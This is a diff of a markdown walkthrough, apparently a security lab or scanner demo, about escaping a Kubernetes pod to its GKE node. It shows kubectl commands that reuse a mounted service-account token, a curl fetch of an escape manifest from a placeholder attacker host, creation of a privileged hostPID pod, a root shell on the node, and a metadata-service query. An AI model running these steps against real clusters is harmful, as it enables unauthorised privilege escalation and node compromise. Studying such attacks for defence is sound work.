@@ -412,6 +412,7 @@ The local node for the nameserver `10.228.0.10` is always the `x.x.x.1` address,
 ```bash
 kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/ auth can-i create pods
 ```
+
 ```
 yes
 ```
@@ -427,6 +428,33 @@ curl -vk http://<attacker_vm_public_ip>8001/pod-esc.yaml -o /tmp/pod-esc.yaml
 ```bash
 kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  apply -f /tmp/pod-esc.yaml
 ```
+```
+pod/priv-and-hostpid-exec-pod created
+```
+
+**Access the node via the just created escape pod**
+```
+kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  exec -it priv-and-hostpid-exec-pod -n default  -- sh
+```
+```
+Unable to use a TTY - input is not a terminal or the right kind of file
+```
+**Now you can run commands on the node**
+```
+id
+```
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Verifying you are on the node via the Google Metadata Service**
+```
+curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/hostname
+```
+```
+gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz.us-central1-f.c.manuel-development-3.internal
+```
+
 
 ## Mondoo scan commands
 
